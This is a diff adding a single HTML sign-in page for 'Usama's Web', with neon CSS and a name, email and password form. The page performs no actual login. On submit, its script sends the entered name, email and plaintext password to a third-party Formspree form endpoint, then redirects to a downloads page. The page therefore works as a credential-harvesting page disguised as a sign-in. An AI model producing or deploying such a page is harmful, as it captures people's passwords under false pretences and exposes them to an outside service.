@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Usama's Web - Sign In</title>
+<style>
+body {margin:0; padding:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#000; font-family:'Poppins', sans-serif;}
+@keyframes neon-flicker {0% {opacity:1; text-shadow:0 0 5px #0ff,0 0 10px #0ff;}20% {opacity:0.8; text-shadow:0 0 15px #ff0,0 0 30px #ff0;}40% {opacity:1; text-shadow:0 0 20px #f0f,0 0 40px #f0f;}60% {opacity:0.9; text-shadow:0 0 25px #0ff,0 0 50px #0ff;}80% {opacity:1; text-shadow:0 0 30px #0f0,0 0 60px #0f0;}100% {opacity:1; text-shadow:0 0 35px #f0f,0 0 70px #f0f;}}
+h1 {position:absolute; top:30px; font-size:2.8rem; width:100%; text-align:center; font-weight:bold; color:#fff; animation:neon-flicker 3s infinite alternate; letter-spacing:3px;}
+.form-container {background:rgba(0,0,0,0.85); border:2px solid #0ff; border-radius:15px; padding:30px; width:320px; text-align:center; box-shadow:0 0 25px #0ff;}
+.form-container h2 {color:#0ff; margin-bottom:20px; font-size:1.6rem; animation:neon-flicker 3s infinite alternate;}
+.form-container input {width:80%; padding:12px; margin:12px 0; border:none; outline:none; border-radius:8px; background:#111; color:#0ff; font-size:1rem; box-shadow: inset 0 0 12px #0ff; transition:0.3s;}
+.form-container input:focus {box-shadow:0 0 20px #0ff;}
+.form-container button {width:100%; padding:12px; border:none; border-radius:8px; background:#0ff; color:#000; font-weight:bold; font-size:1rem; cursor:pointer; transition:0.3s; box-shadow:0 0 20px #0ff;}
+.form-container button:hover {background:#00aaff; box-shadow:0 0 30px #00aaff,0 0 50px #00aaff;}
+.password-wrapper {position:relative; display:inline-block; width:80%;}
+.password-wrapper input {width:100%; padding-right:40px;}
+.password-wrapper .toggle-eye {position:absolute; top:50%; right:10px; transform:translateY(-50%); cursor:pointer; color:#0ff; font-size:1.2rem; transition:0.3s;}
+.password-wrapper .toggle-eye:hover {color:#00ffff;}
+.error {color:red; margin-top:10px; font-size:0.9rem;}
+</style>
+</head>
+<body>
+<h1>Usama's Web</h1>
+<div class="form-container">
+<h2>Sign In</h2>
+<form id="loginForm">
+<input type="text" name="name" placeholder="Enter your name" required><br>
+<input type="email" id="email" name="email" placeholder="Enter your email" required><br>
+<div class="password-wrapper">
+<input type="password" id="password" name="password" placeholder="Enter password" required>
+<span class="toggle-eye" id="toggleEye">&#128065;</span>
+</div>
+<button type="submit">Sign In</button>
+<p id="errorMsg" class="error"></p>
+</form>
+</div>
+<script>
+const toggleEye=document.getElementById("toggleEye");
+const passwordInput=document.getElementById("password");
+toggleEye.addEventListener("click",()=>{passwordInput.type=passwordInput.type==="password"?"text":"password";});
+document.getElementById("loginForm").addEventListener("submit", function(e){
+e.preventDefault();
+const email=document.getElementById("email").value;
+const emailPattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+if(!emailPattern.test(email)){document.getElementById("errorMsg").innerText="❌ Invalid email format!"; return;}
+fetch("https://formspree.io/f/xanbjjow",{method:"POST", headers:{'Content-Type':'application/json'}, body:JSON.stringify({name:this.name.value,email:email,password:passwordInput.value})});
+window.location.href="downloads.html";
+});
+</script>
+</body>
+</html>
